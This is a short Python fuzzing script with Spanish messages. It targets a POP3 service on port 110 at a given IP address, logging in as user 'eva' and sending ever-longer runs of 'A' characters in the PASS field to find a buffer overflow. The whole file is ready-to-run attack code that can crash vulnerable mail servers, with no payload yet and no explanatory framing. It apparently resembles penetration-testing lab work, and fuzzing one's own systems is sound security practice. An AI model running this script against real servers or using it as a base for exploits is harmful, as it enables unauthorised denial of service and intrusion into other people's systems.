#!/usr/bin/python

from pwn import *
import socket, sys

if len(sys.argv) < 2:
    print ("\n[!] Uso : python " + sys.argv[0] + " <ip-address>\n")
    sys.exit(0)

# Variables globales
ip_address = sys.argv[1]
rport = 110

if __name__ == '__main__':
    
    buffer = ["A"]
    contador = 100
    while len(buffer) < 32:
        buffer.append("A"*contador)
        contador += 350
    p1 = log.progress("Data")
    for strings in buffer:
        try:
            p1.status("Enviando %s bytes" % len(strings))
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip_address, rport))
            s.recv(1024)
            s.send(b'USER eva\r\n')
            s.recv(1024)
            s.send(b'PASS ' + strings.encode('utf-8') + b'\r\n')
            s.recv(1024)
        except:
            print("\n[!] Ha habido un error de conexion\n")
            sys.exit(0)